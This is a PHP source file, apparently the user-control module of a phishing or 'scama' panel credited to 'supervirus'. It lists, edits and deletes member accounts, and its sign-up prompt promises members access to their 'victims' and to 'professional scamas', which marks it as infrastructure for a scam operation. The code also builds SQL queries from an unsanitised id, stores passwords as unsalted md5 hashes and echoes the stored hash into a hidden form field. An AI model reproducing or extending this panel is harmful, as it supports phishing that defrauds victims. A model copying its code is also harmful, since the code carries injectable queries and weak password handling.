<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################

switch($type){
	case '';
	if(user_level == 0){
		echo ' <div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
				Soory You Must Be Member To See Your Vistimes  <br />
				Sing Up for Get Your Profisionel Scamas <br />
				<a href="?do=register">Sing Up Here</a>
				</div>';
	}else{
	echo '
	<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
			<table border="1" width="100%">
				<tr class="tr3">
					<td align="center" height="32">#</td>
					<td align="center" height="32">Username</td>
					<td align="center" height="32">E-mail</td>
					<td align="center" height="32">Contry</td>
					<td align="center" height="32">Date Sing Up</td>';
					if(user_id == 1){
					echo '<td align="center" height="32">Ip</td>';
					}
					echo '<td align="center" height="32">Level</td>';
					 if(user_level == 2){
						echo'<td align="center" height="32">Option </td>';
					}
			echo '</tr>';
		$cod_sql_select_all_user = "SELECT * FROM ".prifex."users ORDER BY user_id asc";
		$sql_select_all_user = mysql_query($cod_sql_select_all_user) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	 	$num_sql_user_info = mysql_num_rows($sql_select_all_user);
		if($num_sql_user_info > 0){
			while($row_user_info = mysql_fetch_object($sql_select_all_user)){
			$user_id_db = $row_user_info->user_id;
			$user_name_db = stripcslashes($row_user_info->user_name);
			$user_email_db = stripcslashes($row_user_info->user_email);
			$user_contry_db = stripcslashes($row_user_info->user_contry);
			$user_date_register_db = stripcslashes($row_user_info->user_date_register);
			$user_level_db = $row_user_info->user_level;
			if($user_level_db >= 2){
			$user_level_db2 ='<font face="Tahoma" size="1" color="blue">Admin</font>';
			}elseif($user_level_db < 2){
			$user_level_db2 = '<font face="Tahoma" size="1" color="red">User</font>';
			}
			echo '<tr class="tr1">
					<td width="48" align="center">'.$user_id_db.'</td>
					<td align="center">'.$user_name_db.'</td>
					<td align="center">
					<a href="mailto:'.$user_email_db.'">
					<img border="0" src="image/msn.png" alt="'.$user_email_db.'" width="33" height="28"></a>
					</td>
					<td align="center">'.$user_contry_db.'</td>
					<td align="center">'.date_normal($user_date_register_db).'</td>';
					if(user_id == 1){
					echo '
					<td align="center"><b><font color="#00FF00">123.345.967.97</font></b></td>';
					}
					echo '<td align="center">'.$user_level_db2.'</td>';
					if(user_level == 2){
						echo '<td align="center">';
						 if($user_id_db != 1){
							echo '<a onclick="return confirm(\'Are You Sure To Edit This Member ?\');"
						href="?do=users&type=edit_user&id='.$user_id_db.'">
						<img alt="Edit This User"  src="image/folder_edit.gif" border="0"></a>';
							if(user_id == 1 ){
						echo '<a onclick="return confirm(\'Are You Sure To Delet This Member ?\');"
						href="?do=users&type=delet_user&id='.$user_id_db.'">
						<img alt="Delet This User"  src="image/folder_delete.gif" border="0"></a>';
						 }
						 }else{
						 echo '<b><font face="Tahoma" color="#FF0000" size="1"> Admin </font></b>';
						 }
						echo '</td>';
					}
				echo '</tr>';
			}
			mysql_free_result($sql_select_all_user);
		}else{
		echo '<tr class="tr1">
					<td align="center">There Is No Memeber Now</td>
				</tr>';
			redirect();
		}
		echo '</table>
		</div>';
	}
		break;
	case 'edit_user':
	if (user_level == 2 and $id != 1 ){
	$cod_sql_select_all_user = "SELECT * FROM ".prifex."users WHERE user_id = '$id'";
		$sql_select_all_user = mysql_query($cod_sql_select_all_user) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	 	$num_sql_user_info = mysql_num_rows($sql_select_all_user);
		if($num_sql_user_info > 0){
		$row_user_info = mysql_fetch_object($sql_select_all_user);
			$user_id = $row_user_info->user_id;
			$user_name = $row_user_info->user_name;
			$pass_reyel = $row_user_info->user_password;
			$user_email = $row_user_info->user_email;
			$user_age  = $row_user_info->user_age ;
			$user_contry = $row_user_info->user_contry;
			$user_date_register = $row_user_info->user_date_register;
			$user_level_db = $row_user_info->user_level;
			mysql_free_result($sql_select_all_user);
	echo ' <div class="head_panel">Edit USer ( '.$user_name.' )</div>	
		<div class="body_panel">
		<form method="POST" action="index.php?do=users&type=add_edit">
			<table class="tb" border="0" cellpadding="0" cellspacing="0" width="100%">
					<tr class="tr1">
						<td>Username</td>
						<td width="303"> 
						<input class="inpt" name="name"  value="'.$user_name.'" size="63">
						<input type="hidden" name="id_user" value="'.$user_id.'"></td>
					</tr>
					<tr class="tr2">
						<td><nobr>Level : </nobr></td>
						<td>
						<select class="inpt" name="level">
						<option value="1" '.check_inputs('select',$user_level_db,'1').'>user</option>
						<option value="2" '.check_inputs('select',$user_level_db,'2').'>admin</option>
						</select> </td>
					</tr>
					<tr class="tr1">
						<td>Password</td>
						<td width="303"> 
						<input class="inpt" name="pass" size="63" type="password">
						<input type="hidden" name="pass_reyel" value="'.$pass_reyel.'"></td>
					</tr>
					<tr class="tr2">
						<td>E-mail</td>
						<td width="303"> 
						<input class="inpt" name="email" value="'.$user_email.'" size="63"></td>
					</tr>
					<tr class="tr1">
						<td>Age</td>
						<td width="303"> 
						<select class="inpt" size="1" name="age">';
							$i = 15;
							while($i <= 100){
								if($i < 10){
									echo '<option value="0'.$i.'" '.check_inputs('select',$user_age ,$i).'>0'.$i.'</option>';
								}else{
									echo '<option value="'.$i.'" '.check_inputs('select',$user_age ,$i).'>'.$i.'</option>';
								}
								$i++;
							}
						echo '</select></td>
					</tr>
					<tr class="tr2">
						<td>Contry</td>
						<td width="303"> 
						<select class="inpt" size="1" name="country">
						<option value="Country..." selected>Country...</option>
						<option value="Afganistan">Afghanistan</option>
						<option value="Albania">Albania</option>
						<option value="Algeria">Algeria</option>
						<option value="American Samoa">American Samoa</option>
						<option value="Andorra">Andorra</option>
						<option value="Angola">Angola</option>
						<option value="Anguilla">Anguilla</option>
						<option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
						<option value="Argentina">Argentina</option>
						<option value="Armenia">Armenia</option>
						<option value="Aruba">Aruba</option>
						<option value="Australia">Australia</option>
						<option value="Austria">Austria</option>
						<option value="Azerbaijan">Azerbaijan</option>
						<option value="Bahamas">Bahamas</option>
						<option value="Bahrain">Bahrain</option>
						<option value="Bangladesh">Bangladesh</option>
						<option value="Barbados">Barbados</option>
						<option value="Belarus">Belarus</option>
						<option value="Belgium">Belgium</option>
						<option value="Belize">Belize</option>
						<option value="Benin">Benin</option>
						<option value="Bermuda">Bermuda</option>
						<option value="Bhutan">Bhutan</option>
						<option value="Bolivia">Bolivia</option>
						<option value="Bonaire">Bonaire</option>
						<option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
						<option value="Botswana">Botswana</option>
						<option value="Brazil">Brazil</option>
						<option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
						<option value="Brunei">Brunei</option>
						<option value="Bulgaria">Bulgaria</option>
						<option value="Burkina Faso">Burkina Faso</option>
						<option value="Burundi">Burundi</option>
						<option value="Cambodia">Cambodia</option>
						<option value="Cameroon">Cameroon</option>
						<option value="Canada">Canada</option>
						<option value="Canary Islands">Canary Islands</option>
						<option value="Cape Verde">Cape Verde</option>
						<option value="Cayman Islands">Cayman Islands</option>
						<option value="Central African Republic">Central African Republic</option>
						<option value="Chad">Chad</option>
						<option value="Channel Islands">Channel Islands</option>
						<option value="Chile">Chile</option>
						<option value="China">China</option>
						<option value="Christmas Island">Christmas Island</option>
						<option value="Cocos Island">Cocos Island</option>
						<option value="Colombia">Colombia</option>
						<option value="Comoros">Comoros</option>
						<option value="Congo">Congo</option>
						<option value="Cook Islands">Cook Islands</option>
						<option value="Costa Rica">Costa Rica</option>
						<option value="Cote DIvoire">Cote DIvoire</option>
						<option value="Croatia">Croatia</option>
						<option value="Cuba">Cuba</option>
						<option value="Curaco">Curacao</option>
						<option value="Cyprus">Cyprus</option>
						<option value="Czech Republic">Czech Republic</option>
						<option value="Denmark">Denmark</option>
						<option value="Djibouti">Djibouti</option>
						<option value="Dominica">Dominica</option>
						<option value="Dominican Republic">Dominican Republic</option>
						<option value="East Timor">East Timor</option>
						<option value="Ecuador">Ecuador</option>
						<option value="Egypt">Egypt</option>
						<option value="El Salvador">El Salvador</option>
						<option value="Equatorial Guinea">Equatorial Guinea</option>
						<option value="Eritrea">Eritrea</option>
						<option value="Estonia">Estonia</option>
						<option value="Ethiopia">Ethiopia</option>
						<option value="Falkland Islands">Falkland Islands</option>
						<option value="Faroe Islands">Faroe Islands</option>
						<option value="Fiji">Fiji</option>
						<option value="Finland">Finland</option>
						<option value="France">France</option>
						<option value="French Guiana">French Guiana</option>
						<option value="French Polynesia">French Polynesia</option>
						<option value="French Southern Ter">French Southern Ter</option>
						<option value="Gabon">Gabon</option>
						<option value="Gambia">Gambia</option>
						<option value="Georgia">Georgia</option>
						<option value="Germany">Germany</option>
						<option value="Ghana">Ghana</option>
						<option value="Gibraltar">Gibraltar</option>
						<option value="Great Britain">Great Britain</option>
						<option value="Greece">Greece</option>
						<option value="Greenland">Greenland</option>
						<option value="Grenada">Grenada</option>
						<option value="Guadeloupe">Guadeloupe</option>
						<option value="Guam">Guam</option>
						<option value="Guatemala">Guatemala</option>
						<option value="Guinea">Guinea</option>
						<option value="Guyana">Guyana</option>
						<option value="Haiti">Haiti</option>
						<option value="Hawaii">Hawaii</option>
						<option value="Honduras">Honduras</option>
						<option value="Hong Kong">Hong Kong</option>
						<option value="Hungary">Hungary</option>
						<option value="Iceland">Iceland</option>
						<option value="India">India</option>
						<option value="Indonesia">Indonesia</option>
						<option value="Iran">Iran</option>
						<option value="Iraq">Iraq</option>
						<option value="Ireland">Ireland</option>
						<option value="Isle of Man">Isle of Man</option>
						<option value="Israel">Israel</option>
						<option value="Italy">Italy</option>
						<option value="Jamaica">Jamaica</option>
						<option value="Japan">Japan</option>
						<option value="Jordan">Jordan</option>
						<option value="Kazakhstan">Kazakhstan</option>
						<option value="Kenya">Kenya</option>
						<option value="Kiribati">Kiribati</option>
						<option value="Korea North">Korea North</option>
						<option value="Korea Sout">Korea South</option>
						<option value="Kuwait">Kuwait</option>
						<option value="Kyrgyzstan">Kyrgyzstan</option>
						<option value="Laos">Laos</option>
						<option value="Latvia">Latvia</option>
						<option value="Lebanon">Lebanon</option>
						<option value="Lesotho">Lesotho</option>
						<option value="Liberia">Liberia</option>
						<option value="Libya">Libya</option>
						<option value="Liechtenstein">Liechtenstein</option>
						<option value="Lithuania">Lithuania</option>
						<option value="Luxembourg">Luxembourg</option>
						<option value="Macau">Macau</option>
						<option value="Macedonia">Macedonia</option>
						<option value="Madagascar">Madagascar</option>
						<option value="Malaysia">Malaysia</option>
						<option value="Malawi">Malawi</option>
						<option value="Maldives">Maldives</option>
						<option value="Mali">Mali</option>
						<option value="Malta">Malta</option>
						<option value="Marshall Islands">Marshall Islands</option>
						<option value="Martinique">Martinique</option>
						<option value="Mauritania">Mauritania</option>
						<option value="Mauritius">Mauritius</option>
						<option value="Mayotte">Mayotte</option>
						<option value="Mexico">Mexico</option>
						<option value="Midway Islands">Midway Islands</option>
						<option value="Moldova">Moldova</option>
						<option value="Monaco">Monaco</option>
						<option value="Mongolia">Mongolia</option>
						<option value="Montserrat">Montserrat</option>
						<option value="Morocco">Morocco</option>
						<option value="Mozambique">Mozambique</option>
						<option value="Myanmar">Myanmar</option>
						<option value="Nambia">Nambia</option>
						<option value="Nauru">Nauru</option>
						<option value="Nepal">Nepal</option>
						<option value="Netherland Antilles">Netherland Antilles</option>
						<option value="Netherlands">Netherlands (Holland, Europe)</option>
						<option value="Nevis">Nevis</option>
						<option value="New Caledonia">New Caledonia</option>
						<option value="New Zealand">New Zealand</option>
						<option value="Nicaragua">Nicaragua</option>
						<option value="Niger">Niger</option>
						<option value="Nigeria">Nigeria</option>
						<option value="Niue">Niue</option>
						<option value="Norfolk Island">Norfolk Island</option>
						<option value="Norway">Norway</option>
						<option value="Oman">Oman</option>
						<option value="Pakistan">Pakistan</option>
						<option value="Palau Island">Palau Island</option>
						<option value="Palestine">Palestine</option>
						<option value="Panama">Panama</option>
						<option value="Papua New Guinea">Papua New Guinea</option>
						<option value="Paraguay">Paraguay</option>
						<option value="Peru">Peru</option>
						<option value="Phillipines">Philippines</option>
						<option value="Pitcairn Island">Pitcairn Island</option>
						<option value="Poland">Poland</option>
						<option value="Portugal">Portugal</option>
						<option value="Puerto Rico">Puerto Rico</option>
						<option value="Qatar">Qatar</option>
						<option value="Republic of Montenegro">Republic of Montenegro</option>
						<option value="Republic of Serbia">Republic of Serbia</option>
						<option value="Reunion">Reunion</option>
						<option value="Romania">Romania</option>
						<option value="Russia">Russia</option>
						<option value="Rwanda">Rwanda</option>
						<option value="St Barthelemy">St Barthelemy</option>
						<option value="St Eustatius">St Eustatius</option>
						<option value="St Helena">St Helena</option>
						<option value="St Kitts-Nevis">St Kitts-Nevis</option>
						<option value="St Lucia">St Lucia</option>
						<option value="St Maarten">St Maarten</option>
						<option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
						<option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
						<option value="Saipan">Saipan</option>
						<option value="Samoa">Samoa</option>
						<option value="Samoa American">Samoa American</option>
						<option value="San Marino">San Marino</option>
						<option value="Sao Tome & Principe">Sao Tome &amp; Principe</option>
						<option value="Saudi Arabia">Saudi Arabia</option>
						<option value="Senegal">Senegal</option>
						<option value="Seychelles">Seychelles</option>
						<option value="Sierra Leone">Sierra Leone</option>
						<option value="Singapore">Singapore</option>
						<option value="Slovakia">Slovakia</option>
						<option value="Slovenia">Slovenia</option>
						<option value="Solomon Islands">Solomon Islands</option>
						<option value="Somalia">Somalia</option>
						<option value="South Africa">South Africa</option>
						<option value="Spain">Spain</option>
						<option value="Sri Lanka">Sri Lanka</option>
						<option value="Sudan">Sudan</option>
						<option value="Suriname">Suriname</option>
						<option value="Swaziland">Swaziland</option>
						<option value="Sweden">Sweden</option>
						<option value="Switzerland">Switzerland</option>
						<option value="Syria">Syria</option>
						<option value="Tahiti">Tahiti</option>
						<option value="Taiwan">Taiwan</option>
						<option value="Tajikistan">Tajikistan</option>
						<option value="Tanzania">Tanzania</option>
						<option value="Thailand">Thailand</option>
						<option value="Togo">Togo</option>
						<option value="Tokelau">Tokelau</option>
						<option value="Tonga">Tonga</option>
						<option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
						<option value="Tunisia">Tunisia</option>
						<option value="Turkey">Turkey</option>
						<option value="Turkmenistan">Turkmenistan</option>
						<option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
						<option value="Tuvalu">Tuvalu</option>
						<option value="Uganda">Uganda</option>
						<option value="Ukraine">Ukraine</option>
						<option value="United Arab Erimates">United Arab Emirates</option>
						<option value="United Kingdom">United Kingdom</option>
						<option value="United States of America">United States of America</option>
						<option value="Uraguay">Uruguay</option>
						<option value="Uzbekistan">Uzbekistan</option>
						<option value="Vanuatu">Vanuatu</option>
						<option value="Vatican City State">Vatican City State</option>
						<option value="Venezuela">Venezuela</option>
						<option value="Vietnam">Vietnam</option>
						<option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
						<option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
						<option value="Wake Island">Wake Island</option>
						<option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
						<option value="Yemen">Yemen</option>
						<option value="Zaire">Zaire</option>
						<option value="Zambia">Zambia</option>
						<option value="Zimbabwe">Zimbabwe</option>

						</select>
						</td>
					</tr>
					<tr class="tr1">
						<td colspan="2">
							<div align="center">
							<input align="center" class="btn" type="submit" value="Edit This Memeber Now " name="Login0">
							</div>
					</td>
					</tr>
					</table>
			</form>
		</div>';
	}else{
	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					No user a this id
				</div>';
	}
	}else{
	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	}
	break;
	case 'add_edit':
	if (user_level == 2){
	$name = htmlspecialchars(protection($_POST['name']));
	$pass = md5($_POST['pass']);
	$pass_reyel = htmlspecialchars(protection($_POST['pass_reyel']));
	$email = htmlspecialchars(protection($_POST['email']));
	$age = intval($_POST['age']);
	$level = intval($_POST['level']);
	$id_user = intval($_POST['id_user']);
	$country = htmlspecialchars(protection($_POST['country']));
	if(filter_var($email,FILTER_VALIDATE_EMAIL)){
				$sqldoedit .= "UPDATE ".prifex."users SET ";
				$sqldoedit .= "user_name = '$name', ";
				if($pass != $pass_reyel AND $pass != md5('')){
				$sqldoedit .= "user_password ='$pass', ";
				}				
				$sqldoedit .= "user_email = '$email', ";
				$sqldoedit .= "user_contry = '$country', ";
				$sqldoedit .= "user_age = '$age', ";
				$sqldoedit .= "user_level = '$level' ";
				$sqldoedit .= "WHERE user_id = '$id_user'";
				$sqlqueryedit = mysql_query($sqldoedit) or die(error_sql(mysql_error(),__LINE__,__FILE__));
	}else{
		$error = 'This Email Is Wrong ';
	}		
	}else{
		$error = 'you Don\'t Have Permition ';
	}

	if($error == ''){
	echo '<div class="head_panel">.: User Control  :.</div>	
		<div class="body_panel">
			Edited User Done
		</div>';	
		redirect();
	}else{
	echo '<div class="head_panel">.: User Control  :.</div>	
		<div class="body_panel">
			<font size="2" face="Tahoma" color="red">'.$error.'</font>
		</div>';
	redirect();
	}
	break;
	case 'delet_user':
	if(user_level == 2  and user_id == 1  and $id != 1){
	$cod_sql = "DELETE FROM ".prifex."users WHERE user_id = '$id'";
	$sql_select_scama_id = @mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	echo '<div class="head_panel">.: User Control  :.</div>	
		<div class="body_panel">
			Deleted User Done
		</div>';

	}else{
	echo '<div class="head_panel">.: User Control  :.</div>	
		<div class="body_panel">
			you Don\'t Have Permition
		</div>';
	}
	redirect();
	break;
}
	
?>